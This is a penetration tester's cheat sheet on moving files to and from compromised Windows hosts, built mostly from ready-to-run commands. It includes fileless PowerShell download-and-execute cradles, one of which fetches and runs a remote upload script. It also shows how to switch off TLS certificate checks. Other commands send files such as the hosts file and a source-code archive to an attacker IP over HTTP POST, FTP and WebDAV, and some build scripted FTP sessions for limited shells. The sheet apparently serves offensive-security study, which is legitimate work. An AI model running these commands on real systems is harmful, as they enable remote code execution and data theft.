# File Transfers
## References and Links
[Harmj0y Powershell download cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

## Linux File Transfers
## Windows File Transfers
### PowerShell Base64 Encode/Decode
```powershell
#Base64 Encode
[Convert]::ToBase64String((Get-Content -path "File_to_Encode" -Encoding byte))
#Base64 Decode
[IO.File]::WriteAllBytes("Output_File", [Convert]::FromBase64String("Base64_Encoded_Payload"))
```
### PowerShell Web Downloads
1. Files vs. Fileless  
a. Files = Download and save the file  
b. Fileless = Download and execute without saving the file 
```powershell
# File Download Example
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# Fileless Download Example
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
# We can also pipe the input directly into IEX
(New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
``` 
Powershell v3.0 and later can use Invoke-WebRequest(by default is aliased to ```iwr```,```curl```, and ```wget```)
```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output_File_Name>
```
<ins>**Common Errors with Powershell**</ins>  
Internet Explorer first-launch configuration not being completed will prevent downloads. To bypass, use ```-UseBasicParsing```
```Powershell
Invoke-WebRequest <Target file URL> -UseBasicParsing | IEX
```
SSL/TLS secure channel throws an error if the certificate is not trusted.  
Bypass:
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### SMB Downloads
Create a quick SMB server in Linux
```bash
# Simple Share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Share with Authenticated Access
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

CMD Copy a file from an SMB Server
```cmd
copy \\10.10.10.10\share\file
# This command will be blocked in modern OS's that don't allow unauthenticated guest access
```
CMD Map File share to drive letter with authentication
```cmd
net use n: \\10.10.10.10\share /user:username password
```
### FTP Downloads
FTP Setup on linux attack host
```bash
# Install 
sudo apt install python3-pyftpdlib
# Specify the port, by default pyftpdlib uses port 2121
sudo python3 -m pyftpdlib --port 21
```

Download via FTP using Powershell
```powershell
(New-Object Net.WebClient).DownloadFile('ftp://10.10.10.10/file.txt', '<Output_File_Name>')
```

Create a batch file to download our file (useful if we don't have an interactive shell)
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
### PowerShell Web Uploads
PowerShell doesn't have built-in upload functionality, so we'll have to build it or download it.

Linux Upload Server
```bash
# Install
pip3 install uploadserver

# Usage
python3 -m uploadserver
```

PowerShell Script to Upload a file
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File <File_to_upload>
```
Powershell Base64 WebUpload
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
# Convert file to base64 and enter into variable $b64
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
# Send a web request with the base64 variable in the body
# catch the string with netcat on the other end, and base64 decode the body, giving you the original file
```
### SMB Uploads
Installing WebDav Server
```bash
# apt
sudo apt install python3-wsgidav
# pip
sudo pip3 install wsgidav cheroot
```
Starting the webdav python module
```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```
Connecting to the WebDav share from Windows
```cmd
dir \\10.10.10.10\DavWWWRoot
# DavWWWRoot is not the name of a share. It's a special keyword fro the mini-redirector driver to connect to a webdav share
```
Uploading files using SMB WebDAV
```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```
### FTP Uploads
```powershell
(New-Object Net.WebClient).UploadFile('ftp://10.10.10.10/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
Create a command file for the client to upload a file (useful in limited shells)
```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
## Transferring with Code
## Misc File Transfer Methods
## Catching files over HTTP/S
